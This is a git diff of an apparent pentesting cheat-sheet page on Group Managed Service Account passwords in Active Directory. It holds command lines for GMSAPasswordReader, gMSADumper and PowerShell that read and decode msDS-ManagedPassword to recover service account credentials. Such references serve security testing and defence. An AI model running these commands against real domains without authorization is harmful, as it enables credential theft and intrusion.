@@ -1,8 +1,8 @@
 # GSMA Passwords
 
-{% hint style="info" %}
-User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed.
-{% endhint %}
+## <mark style="color:red;">**GSMA**</mark>
+
+#### User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed.
 
 ## <mark style="color:red;">**GMSA Attributes in the Active Directory**</mark>
 
@@ -15,21 +15,21 @@ User accounts created to be used as service accounts rarely have their password 
 
 GMSAPasswordReader (C#)
 
-```
+```python
 # https://github.com/rvazarkar/GMSAPasswordReader
 GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
 ```
 
 [gMSADumper (Python)](https://github.com/micahvandeusen/gMSADumper)
 
-```
+```python
 # https://github.com/micahvandeusen/gMSADumper
 python3 gMSADumper.py -u User -p Password1 -d domain.local
 ```
 
 Active Directory Powershell
 
-```
+```powershell
 $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
 $blob = $gmsa.'msDS-ManagedPassword'
 $mp = ConvertFrom-ADManagedPasswordBlob $blob
